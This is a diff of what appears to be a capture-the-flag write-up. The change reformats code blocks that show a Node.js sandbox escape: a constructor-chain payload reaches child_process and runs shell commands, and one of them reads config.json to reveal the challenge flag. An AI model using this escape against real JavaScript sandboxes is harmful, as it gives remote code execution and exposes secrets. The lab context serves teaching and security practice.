@@ -1196,7 +1196,9 @@ Then we find this github issue discussing vulnerabilities in this method of sand
 So we can get RCE by inputting the following:
 
 ```
->>> new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("child_process").execSync("pwd")
+>>> new Function(
+"return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())"
+)()("child_process").execSync("pwd")
 
 { type: 'Buffer', data: [ 47, 97, 112, 112, 10 ] }
 ```
@@ -1204,7 +1206,10 @@ So we can get RCE by inputting the following:
 We see that something is returned, but the output isn't very useful to us, so we set the child process to inherit stdio from parent by setting `{stdio: 'inherit'}`
 
 ```
->>> new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("child_process").execSync("pwd", {stdio: 'inherit'})
+>>>
+new Function(
+  "return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())"
+)()("child_process").execSync("pwd", {stdio: 'inherit'})
 
 JSON Error (data was "/app
 {"result":"null","console":[]}")
@@ -1214,7 +1219,10 @@ That's better! Now let's just read the config file since that will contain our f
 
 
 ```
->>> new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("child_process").execSync("ls", {stdio: 'inherit'})
+>>>
+new Function(
+  "return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())"
+)()("child_process").execSync("ls", {stdio: 'inherit'})
 
 JSON Error (data was "config.json
 config.json~
@@ -1229,7 +1237,10 @@ package.json
 run.js
 {"result":"null","console":[]}")
 
->>> new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("child_process").execSync("cat config.json", {stdio: 'inherit'})
+>>>
+new Function(
+  "return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())"
+)()("child_process").execSync("cat config.json", {stdio: 'inherit'})
 
 JSON Error (data was "{
 "flag":"HV18-YtH3-S4nD-bx5A-Nt4G",
